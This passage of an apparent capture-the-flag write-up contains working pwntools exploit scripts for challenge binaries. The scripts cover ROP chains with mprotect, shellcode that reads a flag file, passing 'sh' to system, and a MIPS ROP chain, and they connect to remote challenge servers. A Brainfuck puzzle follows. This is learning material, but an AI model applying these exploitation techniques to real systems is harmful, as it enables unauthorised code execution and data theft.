<span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>pie<span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc<span class="token punctuation">)</span>

read<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x1147d0</span>
ret<span class="token operator">=</span>pie<span class="token operator">+</span><span class="token number">0x0157B</span>
rdi<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x2a3e5</span>
rax<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x45eb0</span>
rsi<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x02be51</span>
r12<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x35731</span>
rdx_r12_r13<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0xa80c8</span>
mprotect<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x11eaa0</span>
call<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x29d8e</span>

sa<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>

rop<span class="token operator">=</span><span class="token string">"X"</span><span class="token operator">*</span><span class="token number">0x30</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
rop<span class="token operator">=</span>rop<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">"X"</span><span class="token punctuation">)</span>

sc<span class="token operator">=</span>asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">"""
movabs rax, 0x67616C66
push 0
push rax
push rsp
mov rdi, -100
pop rsi
xor rdx, rdx
xor r10, r10
mov rax, 0x101
syscall #openat(AT_FDCWD, "flag.txt", 0, 0);

mov rdi, 0x1337000
mov rsi, 0x1000
mov rdx, 1
mov r10, 1
mov r8, rax
xor r9, r9
mov rax, 0x9
syscall #mmap(0x1337000, 0x100, PROT_READ | PROT_WRITE, rax, 1);

mov rdi, 1
mov rsi, 0x1337000
mov rdx, 0x100
mov rax, 1
syscall
"""</span><span class="token punctuation">)</span>

rop<span class="token operator">=</span><span class="token string">""</span>
rop<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pie<span class="token operator">+</span><span class="token number">0x4000</span><span class="token punctuation">)</span>
rop<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span>
rop<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rdx_r12_r13<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
rop<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rdx_r12_r13<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
rop<span class="token operator">+=</span>p64<span class="token punctuation">(</span>mprotect<span class="token punctuation">)</span>
<span class="token comment">#rop+=p64(rdi)+p64(0)</span>
<span class="token comment">#rop+=p64(rsi)+p64(pie+0x4000+0x1000)</span>
<span class="token comment">#rop+=p64(r12)+p64(0x100)</span>
<span class="token comment">#rop+=p64(rdx_r12_r13)+p64(0)*2</span>
<span class="token comment">#rop+=p64(read)</span>
rop<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rax<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pie<span class="token operator">+</span><span class="token number">0x40d0</span><span class="token punctuation">)</span>
rop<span class="token operator">+=</span>p64<span class="token punctuation">(</span>call<span class="token punctuation">)</span>
rop<span class="token operator">+=</span>sc

<span class="token keyword">print</span> <span class="token builtin">len</span><span class="token punctuation">(</span>rop<span class="token punctuation">)</span>
sa<span class="token punctuation">(</span><span class="token string">"first"</span><span class="token punctuation">,</span> rop<span class="token punctuation">)</span>

sla<span class="token punctuation">(</span><span class="token string">"Choice:"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">)</span>
p<span class="token operator">=</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token number">56</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pie<span class="token operator">+</span><span class="token number">0x04060</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pie<span class="token operator">+</span><span class="token number">0x1676</span><span class="token punctuation">)</span>
<span class="token comment">#p="A"*56+p64(canary)+"A"*8+p64(pie+0x1220)</span>
<span class="token comment">#debug()</span>
sa<span class="token punctuation">(</span><span class="token string">"?"</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>


sc<span class="token operator">=</span>asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">"""
movabs rax, 0x67616C66
push 0
push rax
push rsp
mov rdi, -100
pop rsi
xor rdx, rdx
xor r10, r10
mov rax, 0x101
syscall #openat(AT_FDCWD, "flag", 0, 0);

mov rdi, 0x1337000
mov rsi, 0x1000
mov rdx, 1
mov r10, 1
mov r8, rax
xor r9, r9
mov rax, 0x9
syscall #mmap(0x1337000, 0x100, PROT_READ | PROT_WRITE, rax, 1);

mov rdi, 1
mov rsi, 0x1337000
mov rdx, 0x100
mov rax, 1
syscall
"""</span><span class="token punctuation">)</span>


<span class="token comment">#debug()</span>
shell<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>



<h3 id="明日方舟寻访模拟器"><a href="#明日方舟寻访模拟器" class="headerlink" title="明日方舟寻访模拟器"></a>明日方舟寻访模拟器</h3><p>让count变成sh之后传给system，因为输出被关所以把输出道到stderr</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"INFO"</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span> <span class="token string">"splitw"</span><span class="token punctuation">,</span> <span class="token string">"-h"</span><span class="token punctuation">]</span>
<span class="token comment">#io=process("./chal")</span>
io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"47.94.172.18"</span><span class="token punctuation">,</span> <span class="token number">28754</span><span class="token punctuation">)</span>

r <span class="token operator">=</span> <span class="token keyword">lambda</span> a <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span>    a<span class="token operator">=</span><span class="token boolean">False</span>        <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token boolean">True</span>    <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x            <span class="token punctuation">:</span> io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x            <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span>b            <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span>b        <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>
shell <span class="token operator">=</span> <span class="token keyword">lambda</span>            <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>script<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> gdbscript<span class="token operator">=</span>script<span class="token punctuation">)</span>


p<span class="token operator">=</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token number">72</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x4018e5</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x405bcc</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x04018FC</span><span class="token punctuation">)</span>

sl<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>

sh<span class="token operator">=</span><span class="token number">0x6873</span>
<span class="token keyword">while</span> sh<span class="token operator">></span><span class="token number">10000</span><span class="token punctuation">:</span>
        sl<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>
        sl<span class="token punctuation">(</span><span class="token string">"10000"</span><span class="token punctuation">)</span>
        sl<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>
        sh<span class="token operator">-=</span><span class="token number">10000</span>

sl<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span><span class="token string">"6739"</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>

sl<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
<span class="token comment">#debug()</span>
s<span class="token punctuation">(</span>p<span class="token punctuation">)</span>

sl<span class="token punctuation">(</span><span class="token string">"cat flag 1>&amp;2"</span><span class="token punctuation">)</span>
shell<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>



<h3 id="EZ-3-0"><a href="#EZ-3-0" class="headerlink" title="EZ 3.0"></a>EZ 3.0</h3><p>mips rop</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token number">0x00400a20</span> <span class="token punctuation">:</span> lw $a0<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">(</span>$sp<span class="token punctuation">)</span> <span class="token punctuation">;</span> lw $t9<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">(</span>$sp<span class="token punctuation">)</span> <span class="token punctuation">;</span> jalr $t9 <span class="token punctuation">;</span> nop</code></pre>

<p>这gadget可以把a0和t9控制，再跳到t9，a0为函数参数。把a0变成&#x2F;bin&#x2F;cat flag.txt，t9变成system</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'mips'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"INFO"</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span> <span class="token string">"splitw"</span><span class="token punctuation">,</span> <span class="token string">"-h"</span><span class="token punctuation">]</span>
<span class="token comment">#io=process(["qemu-mipsel","-g","1234","./ez"])</span>
io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"47.94.15.198"</span><span class="token punctuation">,</span> <span class="token number">26720</span><span class="token punctuation">)</span>
<span class="token comment">#a=process("./ez")</span>

r <span class="token operator">=</span> <span class="token keyword">lambda</span> a <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span>    a<span class="token operator">=</span><span class="token boolean">False</span>        <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token boolean">True</span>    <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x            <span class="token punctuation">:</span> io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x            <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span>b            <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span>b        <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>
shell <span class="token operator">=</span> <span class="token keyword">lambda</span>            <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>script<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>a<span class="token punctuation">,</span> gdbscript<span class="token operator">=</span>script<span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">"mips"</span><span class="token punctuation">)</span>

cat<span class="token operator">=</span><span class="token number">0x0411010</span>
gadget<span class="token operator">=</span><span class="token number">0x00400a20</span>

<span class="token comment">#p="A"*(32+4*1)+p32(0x004009c8)</span>
p<span class="token operator">=</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>cat<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x400b70</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>cat<span class="token punctuation">)</span>
<span class="token comment">#pause()</span>

sa<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>

shell<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签个到吧"><a href="#签个到吧" class="headerlink" title="签个到吧"></a>签个到吧</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span>+++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>++++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+++++++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++++++++++++++++++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++++++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+++++++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>++++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++++++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>++++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>++++++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span>.<span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+++++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+++++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span>.<span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>++++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++++++++++++++++++++++++++++++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span>.<span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>++++++++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span>.<span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++++++++++++++++++++++++++++++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>++++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span>.<span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+++++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++++++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span><span class="token operator">></span>+++++++++++++++++++++++++<span class="token punctuation">[</span><span class="token operator">&lt;</span>+++++<span class="token operator">></span>-+-+-+-<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span></code></pre>

<p>BrainFuck，但是观察到没有 <code>.</code> 来输出，在每部分后加上即可</p>
<pre class="language-vbnet" data-language="vbnet"><code class="language-vbnet"><span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span>[<span class="token operator">&lt;</span><span class="token operator">+</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">-</span>]<span class="token operator">&lt;</span>.[<span class="token operator">-</span>]<span class="token operator">></span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span class="token operator">+</span><span 